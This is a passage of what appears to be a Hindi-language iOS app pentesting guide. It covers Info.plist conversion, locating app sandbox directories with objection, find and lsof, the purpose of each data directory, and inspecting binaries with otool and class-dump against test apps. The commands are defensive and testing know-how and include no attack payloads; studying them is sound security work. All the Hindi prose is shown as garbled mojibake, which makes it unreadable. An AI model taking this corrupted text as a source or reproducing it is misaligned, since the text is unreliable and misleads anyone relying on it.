рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЬрд╛рдирдХрд╛рд░реА рдзрд╛рд░рдг рдХрд░рддрд╛ рд╣реИред рдЙрдкрд▓рдмреНрдз рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреА рд╡рд┐рд╕реНрддреГрдд рдЕрдиреНрд╡реЗрд╖рдг рдХреЗ рд▓рд┐рдП, рдХреЛрдИ рднреА [**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc) рдХрд╛ рд╕рдВрджрд░реНрдн рд▓реЗ рд╕рдХрддрд╛ рд╣реИред

рдЙрди рд▓реЛрдЧреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдПрдХ рдЕрдзрд┐рдХ рдкрд╣реБрдВрдЪрдиреАрдп рд╕реНрд╡рд░реВрдк рдореЗрдВ, XML рдкрд░рд┐рд╡рд░реНрддрди рдХреЛ `plutil` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореИрдХрдУрдПрд╕ рдкрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (10.2 рдФрд░ рдмрд╛рдж рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░ рд╕реНрд╡рдд: рдЙрдкрд▓рдмреНрдз) рдпрд╛ рд▓рд┐рдирдХреНрд╕ рдкрд░ `plistutil` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдкрд░рд┐рд╡рд░реНрддрди рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рд╣реИрдВ:

* **рдореИрдХрдУрдПрд╕ рдХреЗ рд▓рд┐рдП**:
```bash
$ plutil -convert xml1 Info.plist
```
* **рд▓рд┐рдирдХреНрд╕ рдХреЗ рд▓рд┐рдП**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
рдорд╣рд╛рдЬрд┐рди **Info.plist** рдлрд╝рд╛рдЗрд▓ рджреНрд╡рд╛рд░рд╛ рдЬреЛ рдЕрдирдЧрд┐рдирдд рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЙрд╕рдореЗрдВ рдРрдк рдХреА рдЕрдиреБрдорддрд┐ рд╕реНрдЯреНрд░рд┐рдВрдЧ (`UsageDescription`), рдХрд╕реНрдЯрдо URL рд╕реНрдХреАрдо (`CFBundleURLTypes`), рдФрд░ App Transport Security рдХреЗ рд▓рд┐рдП рд╡рд┐рдиреНрдпрд╛рд╕ (`NSAppTransportSecurity`) рд╢рд╛рдорд┐рд▓ рд╣реИрдВред рдЗрди рдПрдВрдЯреНрд░реАрдЬ, рдФрд░ рдЕрдиреНрдп рдЬреИрд╕реЗ рдХрд┐ рдирд┐рд░реНрдпрд╛рдд/рдЖрдпрд╛рдд рдХрд┐рдП рдЧрдП рдХрд╕реНрдЯрдо рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкреНрд░рдХрд╛рд░ (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`), рдЖрд╕рд╛рдиреА рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ рдпрд╛ рдПрдХ рд╕рд░рд▓ `grep` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
$ grep -i <keyword> Info.plist
```
**рдбреЗрдЯрд╛ рдкрде**

iOS рдорд╛рд╣реМрд▓ рдореЗрдВ, рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ **рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЗ рд▓рд┐рдП рд╣реИрдВред рд╕рд┐рд╕реНрдЯрдо рдПрдкреНрд▓рд┐рдХреЗрд╢рди `/Applications` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд░рд╣рддреЗ рд╣реИрдВ, рдЬрдмрдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЗрдВ `/private/var/containers/` рдХреЗ рдиреАрдЪреЗ рд░рдЦреА рдЬрд╛рддреА рд╣реИрдВред рдЗрди рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **128-рдмрд┐рдЯ UUID** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЦреЛрдЬрдирд╛ рдХрдард┐рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдирд╛рдореЛрдВ рдХреА рдЕрдирд┐рдпрдорд┐рддрддрд╛ рд╣реЛрддреА рд╣реИред

рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХреА рдЧрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕реНрдерд╛рдкрдирд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЦреЛрдЬ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **objection рдЯреВрд▓** рдПрдХ рдЙрдкрдпреЛрдЧреА рдХрдорд╛рдВрдб, `env` рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдХрдорд╛рдВрдб рд╕рд╡рд╛рд▓ рдореЗрдВ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рд╡рд┐рд╕реНрддреГрдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИред рдиреАрдЪреЗ рдЗрд╕ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
рд╡рд┐рдХрд▓реНрдк рд╕реЗ, рдРрдк рдирд╛рдо рдХреЛ `find` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `/private/var/containers` рдореЗрдВ рдЦреЛрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
find /private/var/containers -name "Progname*"
```
Commands рдЬреИрд╕реЗ `ps` рдФрд░ `lsof` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдФрд░ рдЦреБрд▓реА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдХреНрд░рд┐рдп рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдорд╛рд░реНрдЧреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдВрджрд░реВрдиреА рджреГрд╢реНрдп рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**рдмрдВрдбрд▓ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛:**

* **AppName.app**
* рдпрд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдВрдбрд▓ рд╣реИ рдЬреИрд╕рд╛ IPA рдореЗрдВ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рдореЗрдВ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдбреЗрдЯрд╛, рд╕реНрдерд┐рд░ рд╕рд╛рдордЧреНрд░реА рдФрд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ рдХрдВрдкрд╛рдЗрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдмрд╛рдЗрдирд░реА рд╣реЛрддрд╛ рд╣реИред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ**ред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рдХреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдХрд╛ **рдмреИрдХрдЕрдк рдирд╣реАрдВ рд╣реЛрддрд╛**ред
* рдЗрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХреЛрдб рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ **рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**рдбреЗрдЯрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛:**

* **Documents/**
* рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдбреЗрдЯрд╛ рдХреЛ рдпрд╣рд╛рдБ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЕрдВрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕ рдбреЗрдЯрд╛ рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдкреНрд░рд╛рд░рдВрдн рдХрд░рддрд╛ рд╣реИред
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдЦрд╛рдИ рджреЗрддрд╛ рд╣реИ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ**ред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдХрд╛ **рдмреИрдХрдЕрдк рд╣реЛрддрд╛ рд╣реИ**ред
* рдПрдкреНрд▓рд┐рдХреЗрд╢рди `NSURLIsExcludedFromBackupKey` рд╕реЗрдЯ рдХрд░рдХреЗ рдкрдереЛрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **Library/**
* **рдЙрди рд╕рднреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдирд╣реАрдВ рд╣реИрдВ**, рдЬреИрд╕реЗ **рдХреИрд╢**, **рдкрд╕рдВрдж**, **рдХреБрдХреАрдЬрд╝**, рдФрд░ рдкреНрд░реЙрдкрд░реНрдЯреА рд╕реВрдЪреА (plist) рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* iOS рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЖрдо рддреМрд░ рдкрд░ `Application Support` рдФрд░ `Caches` рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╕реНрдЯрдо рдЙрдкрдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдБ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред
* **Library/Caches/**
* **рдЕрд░реНрдз-рд╕реНрдерд╛рдпреА рдХреИрд╢ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ**ред
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рджрд┐рдЦрд╛рдИ рдирд╣реАрдВ рджреЗрддрд╛ рдФрд░ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВ**ред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдХрд╛ **рдмреИрдХрдЕрдк рдирд╣реАрдВ рд╣реЛрддрд╛**ред
* рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реЛ рдФрд░ рд╕реНрдЯреЛрд░реЗрдЬ рд╕реНрдкреЗрд╕ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реЛ, рддреЛ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИред
* **Library/Application Support/**
* рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ **рд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ** рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрджреГрд╢реНрдп** рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрд╕реЗ рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реИрдВред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдХрд╛ **рдмреИрдХрдЕрдк рд╣реЛрддрд╛ рд╣реИ**ред
* рдПрдкреНрд▓рд┐рдХреЗрд╢рди `NSURLIsExcludedFromBackupKey` рд╕реЗрдЯ рдХрд░рдХреЗ рдкрдереЛрдВ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* **Library/Preferences/**
* рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рднреА **рд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдмрдиреЗ рд░рд╣рдиреЗ рд╡рд╛рд▓реА** рдЧреБрдгрд╡рддреНрддрд╛ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЬрд╛рдирдХрд╛рд░реА, рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдореЗрдВ рдПрдХ plist рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдЕрдм рддрдХ рдЕрдирдХреНрд░рд┐рдкреНрдЯреЗрдб рд░реВрдк рдореЗрдВ рд╕рд╣реЗрдЬреА рдЬрд╛рддреА рд╣реИ рдЬрд┐рд╕реЗ \[BUNDLE\_ID].plist рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред
* `NSUserDefaults` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЧрдП рд╕рднреА рдХреБрдВрдЬреА/рдорд╛рди рдЬреЛ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣реИрдВ, рдЙрдиреНрд╣реЗрдВ рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **tmp/**
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдРрд╕реА **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ** рд▓рд┐рдЦ рд╕рдХреЗрдВ рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рдмреАрдЪ рд╕реНрдерд╛рдпреА рдирд╣реАрдВ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛред
* рдЕрд╕реНрдерд╛рдпреА рдХреИрд╢ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВред
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ **рдЕрджреГрд╢реНрдп** рд╣реИред
* рдЗрд╕ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдмреИрдХрдЕрдк рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред
* рдЬрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдирд╣реАрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реЛ рдФрд░ рд╕реНрдЯреЛрд░реЗрдЬ рд╕реНрдкреЗрд╕ рдХрдо рд╣реЛ рд░рд╣рд╛ рд╣реЛ, рддреЛ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдлрд╝рд╛рдЗрд▓реЗрдВ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рд╣рдЯрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЪрд▓рд┐рдП iGoat-Swift рдХреА рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдВрдбрд▓ (.app) рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдирдЬрджреАрдХ рд╕реЗ рджреЗрдЦрддреЗ рд╣реИрдВ (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`)ред
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### рдмрд╛рдЗрдирд░реА рд░рд┐рд╡рд░реНрд╕рд┐рдВрдЧ

`<application-name>.app` рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдЖрдкрдХреЛ `<application-name>` рдирд╛рдордХ рдПрдХ рдмрд╛рдЗрдирд░реА рдлрд╝рд╛рдЗрд▓ рдорд┐рд▓реЗрдЧреАред рдпрд╣ рдлрд╝рд╛рдЗрд▓ рд╡рд╣ рдлрд╝рд╛рдЗрд▓ рд╣реИ рдЬреЛ **рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд** рдХреА рдЬрд╛рдПрдЧреАред рдЖрдк **`otool`** рдЙрдкрдХрд░рдг рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реА рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдРрдк рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рд╣реИ**

рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рд╣реИ:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**рдмрд╛рдЗрдирд░реА рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░реЗрдВ**

рдЯреЗрдХреНрд╕реНрдЯ рд╕реЗрдХреНрд╢рди рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рд╡рд┐рд╢реНрд▓реЗрд╖рд┐рдд рдХрд░реЗрдВ:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
рдЙрджрд╛рд╣рд░рдг рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ **Objective-C рд╕реЗрдЧрдореЗрдВрдЯ** рдХреЛ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
рдПрдХ рдФрд░ рд╕рдВрдХреНрд╖рд┐рдкреНрдд Objective-C рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк [**class-dump**](http://stevenygard.com/projects/class-dump/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдмрд╛рдЗрдирд░реА рдХреЛ рдбрд┐рд╕рдПрд╕реЗрдВрдмрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдЕрдЪреНрдЫреЗ рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ: [**Hopper**](https://www.hopperapp.com/download.html?) рдФрд░ [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдСрдЯреЛрдореЗрдЯрд┐рдХ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛рдПрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## рдбреЗрдЯрд╛ рд╕реНрдЯреЛрд░реЗрдЬ

рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ iOS рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдВ рдбреЗрдЯрд╛ рдХреИрд╕реЗ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдкреЗрдЬ рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
